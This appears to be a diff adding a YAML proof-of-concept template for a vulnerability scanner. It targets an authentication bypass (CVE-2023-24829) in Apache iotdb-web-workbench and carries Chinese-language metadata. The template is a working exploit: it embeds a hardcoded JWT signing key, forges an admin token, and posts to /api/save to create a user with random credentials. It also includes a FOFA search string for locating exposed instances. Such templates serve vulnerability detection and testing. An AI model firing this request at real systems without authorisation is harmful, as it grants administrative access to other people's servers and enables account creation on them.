@@ -1,0 +1,24 @@
+id: poc-yaml-apache-iotdb-web-workbench-authentication-bypass
+info:
+  name: Apache iotdb-web-workbench 认证绕过漏洞 (CVE-2023-24829)
+  severity: high
+  tags:
+  - CVE-2023-24829
+  - 授权不当
+  finger: iotdb
+  fofa: title="iotdb"
+variables:
+  t1: random_str(6)
+  t2: random_str(6)
+  r_key: HSyJ0eXAiOiJKV1QasdfffffffSd3g8923402347523fffasdfasgwaegwaegawegawegawegawetwgewagagewasdf23r23DEEasdfawef134t2fawt2g325gafasdfasdfiLCJhbGciOiJIUzI1NiJ9
+  r_token: gen_jwt(`{"sub":"0","userId":1,"name":"admin"}`, "HS256", r_key)
+requests:
+- method: POST
+  path: /api/save
+  headers:
+    Content-Type: application/json
+    Authorization: '{{.r_token}}'
+  data: '{"name":"{{.t1}}","password":"{{.t2}}"}'
+  expression: status_code == 200 && contains(body,"\"message\":\"Save successful\"")
+    && !contains(body,"<") && contains(headers,"application/json")
+transport: http
